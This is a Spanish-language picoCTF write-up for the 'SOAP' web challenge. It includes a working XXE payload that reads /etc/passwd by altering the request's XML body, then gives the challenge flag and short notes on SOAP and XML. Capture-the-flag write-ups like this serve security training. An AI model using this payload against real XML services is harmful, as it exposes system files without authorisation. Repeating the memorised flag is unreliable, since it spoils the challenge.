### SOAP

### Descripción

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:63235/)
### Solución

### Solucion 1

- Abrimos la pagina
- Abrimos vemos en inspeccion que al momento de darle en el boton dellate el id puede cambiar, nos vamos a netwrok y le damos resend
- En el body Cambiamos el XML que esta ahi por el xxe este
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]> <data><ID>&xxe;</ID></data>
```
- vamos a request y hasta abajo nos sale la bandera.
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}

 
### Notas
- SOAP (anteriormente conocido como Simple Object Access Protocol) es un protocolo ligero para el intercambio de información en entornos descentralizados y distribuidos.
- XML es un lenguaje de marcado similar a HTML. Significa Extensible Markup Language (Lenguaje de Marcado Extensible) y es una especificación de [W3C](https://www.w3.org/TR/xml/) como lenguaje de marcado de propósito general. Esto significa que, a diferencia de otros lenguajes de marcado, XML no está predefinido, por lo que debes definir tus propias etiquetas.
### Referencias
- https://www.ibm.com/docs/es/rsas/7.5.0?topic=standards-soap
- http://developer.mozilla.org/es/docs/Web/XML/Guides/XML_introduction